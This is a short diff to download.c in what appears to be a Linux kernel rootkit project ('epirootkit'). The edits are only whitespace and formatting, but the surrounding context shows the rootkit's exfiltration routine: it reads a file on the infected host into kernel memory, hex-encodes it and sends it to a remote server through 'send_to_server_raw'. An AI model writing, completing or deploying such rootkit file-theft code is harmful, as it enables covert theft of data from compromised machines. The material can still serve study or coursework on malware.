@@ -1,4 +1,5 @@
 #include "download.h"
+
 #include "epirootkit.h"
 #include "io.h"
 #include "network.h"
@@ -49,7 +50,7 @@ int download_handler(char *args, enum Protocol protocol) {
         send_to_server(protocol, "File is empty or unreadable.\n");
         return -EINVAL;
     }
-    
+
     char *buffer = vmalloc(size);
     if (!buffer) {
         filp_close(filp, NULL);
@@ -96,7 +97,7 @@ int download(const char *command) {
         }
 
         for (long i = 0; i < download_size; ++i) {
-            snprintf(hex_buffer + (i * 2), 3, "%02x", (unsigned char) download_buffer[i]);
+            snprintf(hex_buffer + (i * 2), 3, "%02x", (unsigned char)download_buffer[i]);
         }
 
         int ret = send_to_server_raw(hex_buffer, hex_size);
@@ -107,7 +108,6 @@ int download(const char *command) {
         vfree(hex_buffer);
         reset_download_state();
         return 0;
-
     }
 
     DBG_MSG("download: command ignored or not in transfer mode\n");
